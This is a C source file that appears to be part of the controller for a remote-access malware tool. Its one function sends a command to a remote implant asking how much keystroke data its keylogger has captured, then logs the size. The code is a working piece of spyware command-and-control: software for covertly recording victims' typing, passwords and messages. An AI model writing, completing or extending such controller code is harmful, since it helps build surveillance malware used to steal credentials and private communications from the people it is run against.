#include <stdlib.h>
#include "types.h"
#include "logger.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"

int command_Keylogger_Size(void)
{
	if(net_SendCmd((uint8*)" ", 1, COMMANDS_KEYLOGGER_SIZE) == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to send!\n");

		return NET_LOST_CONNECTION;
	}

	uint8* rmsg;

	int rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES);

	if(rv == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to receive!\n");
		free(rmsg);

		return NET_LOST_CONNECTION;

	}else if(rv == NET_TIMED_OUT){
		LOG(LOG_ERR, "Time out!\n");
		free(rmsg);

		return NET_LOST_CONNECTION;
	}

	if(rmsg[0] == COMMANDS_DISAPPROVE)
	{
		LOG(LOG_ERR, "The keylogger may not be running ?\n");
	}else if(rmsg[0] == COMMANDS_APPROVE){
		
		uint32 size = (rmsg[1] & 0xFF) | (rmsg[2] & 0xFF) << 8 | (rmsg[3] & 0xFF) << 16 | (rmsg[4] & 0xFF) << 24;

		LOG(LOG_SUCC, "Keylogger size: %d %s\n", (size / 1024) < 1 ? size : size / 1024, (size / 1024) < 1 ? "B" : "KB");
	}

	free(rmsg);

	return COMMANDS_SUCC;
}